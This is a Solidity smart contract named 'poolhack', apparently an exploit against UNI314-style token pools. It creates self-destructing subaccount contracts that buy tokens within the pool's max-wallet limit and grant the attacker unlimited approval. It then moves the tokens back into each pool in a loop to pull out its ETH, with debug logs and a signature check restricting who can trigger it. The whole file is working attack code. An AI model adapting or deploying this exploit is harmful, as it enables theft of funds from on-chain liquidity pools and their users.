// SPDX-License-Identifier: MIT
// Compatible with OpenZeppelin Contracts ^5.0.0
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "./UNI314.sol";
import "hardhat/console.sol";

contract poolhack is EIP712 {
    constructor(
        address[] memory pools,permitinfo memory _permit
    )EIP712("poolhack", "1")payable{
        require(
            msg.sender==t_permit(_permit),"no signer"
        );
        console.log("test start");
        hack(pools,_permit);
        console.log("test end");
        // payable(msg.sender).transfer(address(this).balance);
        // selfdestruct(payable(msg.sender));
    }
    
    function nonces(address owner) public pure returns (uint256) {
        owner;
        return 0;
    }
    struct permitinfo{
        address owner;
        address spender;
        uint value;
        uint deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }
    function t_permit(
        permitinfo memory _permit
    )public view returns(address signer){
        bytes32 structHash = keccak256(abi.encode(keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"), 
        _permit.owner, 
        _permit.spender, 
        _permit.value, 
        nonces(
        _permit.owner), 
        _permit.deadline));
        bytes32 hash = _hashTypedDataV4(structHash);
        signer = ecrecover(hash, 
        _permit.v, 
        _permit.r, 
        _permit.s);
    }
    function getethamount(
        address pool,
        permitinfo memory _permit
    )public view onlyOwner(_permit) returns(uint256 amount){
        return pool.balance;
        // *510204081632653 / 500000000000000;
    }
    function hack(address[] memory pools,permitinfo memory _permit)public payable onlyOwner(_permit) {
        for (uint i = 0; i < pools.length; i++) {
            UNI314 pool = UNI314(payable(pools[i]));
            uint256 maxWallet= pool._maxWallet();
            uint256 swap_t_balance = pool.balanceOf(pools[i])/3;
            if (swap_t_balance<=maxWallet) {
                address subaccounts = address(new subaccount{value:pools[i].balance/2}(pool));
                // pool.rebase();
                pool.transferFrom(
                        subaccounts,
                        pools[i],
                        pool.balanceOf(subaccounts)
                    );
            }else{
                uint256 times = swap_t_balance/maxWallet;
                uint256 one_eth = pools[i].balance/2/(times+1);
                console.log(maxWallet,swap_t_balance);
                console.log(times,"test1");
                address[] memory subaccounts = new address[](times);
                for (uint j = 0; j < times; j++) {
                    console.log("test creat 1");
                    subaccounts[j] = address(new subaccount{value:one_eth}(pool));
                    console.log("test creat 2");
                }
                // pool.rebase();
                for (uint j = 0; j < subaccounts.length; j++) {
                    pool.transferFrom(
                        subaccounts[j],
                        pools[i],
                        pool.balanceOf(subaccounts[j])
                    );
                }
            }
        }
        console.log("after (this).balance",address(this).balance);
    }
    modifier onlyOwner(permitinfo memory _permit) {
        require(
            msg.sender==t_permit(_permit),"no signer"
        );
        _;
    }
}
contract subaccount{
    constructor(UNI314 pool)payable{
        console.log("transfer test 1");
        console.log("msg.value",msg.value);
        payable(pool).transfer(msg.value);
        console.log("transfer test 2");
        pool.approve(msg.sender,2**255);
        console.log("transfer test 3");
        selfdestruct(payable(msg.sender));
    }
}